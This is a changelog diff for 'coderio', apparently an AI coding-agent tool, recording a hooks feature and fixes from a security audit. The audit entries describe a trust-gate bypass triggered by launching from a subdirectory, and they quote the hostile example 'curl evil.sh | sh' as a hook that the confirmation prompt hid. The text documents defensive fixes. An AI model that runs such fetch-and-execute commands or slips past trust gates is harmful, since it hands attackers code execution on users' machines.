@@ -6,7 +6,7 @@ All notable changes to coderio are documented here. The format follows
 `pyproject.toml`'s `[project].version` — `coderio.__version__` reads it via
 `importlib.metadata`.
 
-## [Unreleased]
+## [0.4.1] — 2026-08-17
 
 ### Added
 - **Hooks system (v1)**: user-configurable lifecycle hooks via `[[hooks]]`
@@ -25,10 +25,49 @@ All notable changes to coderio are documented here. The format follows
   repo-level config.toml automatically ride the existing repo-config trust
   gate — no separate trust flow. Serial execution (first blocker's reason
   wins; all hooks still run for their side effects). New module
-  `agent/hooks.py` (+20 tests incl. real-subprocess semantics and a `coderio
-  run` end-to-end). v1 non-goals documented: SessionEnd (no injection point),
+  `agent/hooks.py`. v1 non-goals documented: SessionEnd (no injection point),
   Notification/SubagentStop/PreCompact, updatedInput rewriting, hook-allow
-  bypassing permission prompts, parallel execution.
+  bypassing permission prompts, parallel execution. POSIX hook subprocesses
+  get their own process group (a hook timeout would otherwise SIGKILL the
+  agent itself — caught by the CI OS matrix, invisible on Windows).
+  (Shipped after the v0.4.0 tag; +20 tests incl. real-subprocess semantics,
+  a `coderio run` end-to-end, and post-v3 seam tests.)
+
+### Fixed — 2026-08-14 v3 audit (2 P0 + 4 P1, all verified with the report's repro scripts)
+- **P0 · hooks: tool-event hooks from a real config.toml always crashed.** Two
+  classes named HookSpec existed — config/models.py's (a plain dataclass,
+  no .matches()) and agent/hooks.py's (the runtime class). The loader produced
+  the former; HookRunner.fire called .matches() on it → AttributeError on every
+  PreToolUse/PostToolUse hook, the exact scenario the README leads with. All 20
+  in-module tests stayed green because they imported the runtime class
+  directly — the config↔runtime seam had zero coverage. Fix: models.HookSpec
+  deleted; _parse_hooks produces agent.hooks.HookSpec (single source of truth);
+  +2 SEAM tests (load_config → HookRunner.fire → assert blocked) that fail with
+  the same AttributeError if a duplicate class ever reappears.
+- **P0 · trust gate bypassed when launching from a subdirectory.** The gate
+  checked one directory (anchored on .coderio/config.toml) while mcp_loader
+  walks UP for .mcp.json independently — a repo whose root had ONLY .mcp.json
+  + launching from any subdirectory skipped the gate entirely while the server
+  still loaded. Fix: trust discovery now mirrors the loaders (per-file upward
+  walk, same stop conditions); the principle "trust scope ⊇ load scope" is
+  enforced. Trust confirmed once at any depth covers the whole repo (store
+  keys by discovered root). +2 tests incl. the report's exact bypass scenario.
+- **P1 · trust summary blind-signed hooks**: the confirmation prompt showed
+  only ".coderio/config.toml (76 bytes)" while a hook ran "curl evil.sh | sh"
+  — hooks are the repo's most direct RCE surface and were invisible. The
+  summary now echoes every line mentioning command/hooks/args/env, and MCP
+  entries show args + env key names (values not leaked). +2 tests.
+- **P1 · hook errors were silently swallowed**: HookOutcome.error had zero
+  consumers — a broken hook (exit 127) was invisible. fire() now logs a
+  warning whenever error is non-empty.
+- **P1 · a hook-layer exception could break the turn**: HookRunner.fire wraps
+  the whole dispatch loop in try/except (fail-open, consistent with the
+  module's stated positioning) — covers both middleware and turn-level paths.
+- **P2 · headless run could lose the final answer**: non-quiet mode relied
+  solely on the token stream; a non-streamed final message vanished. The
+  final result is now always printed (after a separator in non-quiet mode).
+
+## [Unreleased]
 
 ## [0.4.0] — 2026-08-17
 
